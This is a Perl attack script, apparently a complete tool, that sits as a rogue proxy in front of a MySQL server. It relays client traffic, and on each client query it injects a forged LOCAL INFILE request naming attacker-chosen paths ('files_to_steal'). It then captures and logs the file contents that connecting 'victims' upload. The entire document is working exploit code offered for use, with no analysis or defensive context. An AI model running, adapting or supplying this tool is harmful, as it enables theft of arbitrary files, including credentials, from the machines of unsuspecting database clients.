#!/usr/bin/perl

use strict;
use Socket;
use FindBin qw($Bin);
use IO::Socket::INET;
use IO::Select;

my %remaining_files_to_steal;

my $listen_port = shift @ARGV;
my $target_host = shift @ARGV;
my $target_port = shift @ARGV;
my @files_to_steal = @ARGV;
die "Usage: $0 listen_port target_host target_port file1-to-steal [file2-to-steal]" if((!$target_port)||(!scalar @files_to_steal));

my $target_addr =  "$target_host:$target_port";
my $proxy_server = IO::Socket::INET->new(Listen => 5, LocalPort => $listen_port, ReuseAddr => 1) or die ("Cant listen: $!");

my %victims;
my %upstreams;

my $s = IO::Select->new();
$s->add($proxy_server);

my %files_to_steal_from_client;

while(my @ready = $s->can_read()) {
	for my $r (@ready) {
		if($r == $proxy_server) {
			# new connection received
			my $victim = $proxy_server->accept;
			my $peerhost = $victim->peerhost;
			mylog("Victim connected: $peerhost");
			
			my $upstream_server = IO::Socket::INET->new(PeerAddr => $target_addr);
			if(!$upstream_server) {
				warn "Couldn't connect to $target_addr";
				next;
			}
			$s->add($victim);
			$s->add($upstream_server);
			
			$victims{$victim} = $upstream_server;
			$upstreams{$upstream_server} = $victim;
			
			if(!defined($files_to_steal_from_client{$peerhost})) {
				my @copy = @files_to_steal;
				$files_to_steal_from_client{$peerhost} = \@copy;
			}
		}
		elsif(my $upstream = $victims{$r}) {
			# victim
			my $victim = $r;
			my $read = sysread($r, my $buf, 4096);
			if(!defined($r)) {
				warn "Error while reading from victim: $!";
				closeboth($s, $victim, $upstream);
				next;
			}
			if(!$read) {
				# no, it disconnected
				warn "Victim disconnected";
				closeboth($s, $victim, $upstream);
				next;
			}
			
			mylog("V->U:\n%s\n", hexdump($buf)) if($ENV{VERBOSE});

			# lets see if it was a query and whether anything to be injected
			my $payload_length = unpack('V', substr($buf, 0, 3)."\0");
			if(($payload_length +4 == length($buf)) && (ord(substr($buf, 4, 1)) == 3)) {
				my $peerhost = $victim->peerhost;
				my $f = shift @{$files_to_steal_from_client{$peerhost}};
				if($f) {
					if(!send_file_upload_request($victim, $f)) {
						warn "Couldn't inject message to the client";
						closeboth($s, $victim, $upstream);
						next;					
					}
					eval {
						my $content = receive_file_upload($victim);
						mylog(">>V<<: %s\n%s\n\n", $f, $content);
					};
					if($@) {
						warn "Error while reading response to the injected file upload request: $@";
						#closeboth($s, $victim, $upstream);
						#next;											
					}
				}
			}
			
			# victim sent a message to be relayed
			if(!syswrite($upstream, $buf)) {
				warn "Couldn't write to upstream mysql server";
				closeboth($s, $victim, $upstream);
				next;
			}
			
		}
		elsif(my $victim = $upstreams{$r}) {
			# upstream
			my $upstream = $r;			
			my $read = sysread($r, my $buf, 4096);
			if(!defined($read)) {
				warn "Error while reading from upstream: $!";
				closeboth($s, $victim, $upstream);
				next;
			}
			if(!$read) {
				# no, it disconnected
				warn "Upstream disconnected";
				closeboth($s, $victim, $upstream);
				next;
			}

            mylog("U->V:\n%s\n", hexdump($buf)) if($ENV{VERBOSE});
			
			# victim sent a message to be relayed
			if(!syswrite($victim, $buf)) {
				warn "Couldn't write to victim";
				closeboth($s, $victim, $upstream);
				next;
			}

		} 
		else {
			# this is fine when one of the parties is lost
		}
	}
}

sub closeboth {
	my ($s, $v, $u) = @_;
	close($v);
	close($u);
	$s->remove($v);
	$s->remove($u);
	delete $victims{$v};
	delete $upstreams{$u};
}

sub hexdump {
	my $b = shift;
	my $re = "";
	for(my $i = 0; $i < length($b); $i += 16) {
		my $a = substr($b, $i, 16);
		my $unpacked = unpack("H*", $a);
		my $f1 = substr($unpacked, 0, 16);
		my $f2 = substr($unpacked, 16);
		$re .= sprintf("%-16s %-16s  ", $f1, $f2);
		$a =~ s/[^[:print:]]/./g;
		$re .= "$a\n";
	}
	return $re;
}

sub mylog {
	my $fmt = shift;
	my $msg = sprintf($fmt, @_);
	printf("[%s] %s\n", localtime()."", $msg);
}


sub send_file_upload_request {
	my $sock = shift;
	my $path = shift;
	
	my $data;
	
	$data .= chr(length($path)+1);
	$data .= "\0"; 
	$data .= "\0"; 
	$data .= chr(1);
	$data .= chr(0xfb);
	$data .= $path;

    mylog("INJECTING MESSAGE:\n%s", hexdump($data));

	return syswrite($sock, $data);	
}

sub receive_file_upload {
	my $sock = shift;
	
	my $read = sysread($sock, my $data, 4096);
	die "Couldn't read: $!" if(!defined($read));
	die "No response received" if(!$read);
		
	mylog("RESPONSE TO INJECTED MESSAGE:\n%s", hexdump($data));

	my $payload_length = unpack('V', substr($data, 0, 3)."\0");
	my $content = substr($data, 4, $payload_length);
	
	# there is both a header and a tailer
	die "Unexpected length (the file might be missing on the client side or it is too large and this dummy script doesn't support that)" if(length($data) < $payload_length + 4);
	
	# printf "%d %s\n", length($data), unpack("H*", $data);
	
	# print "Suffix: $r\n";
	return $content;
}

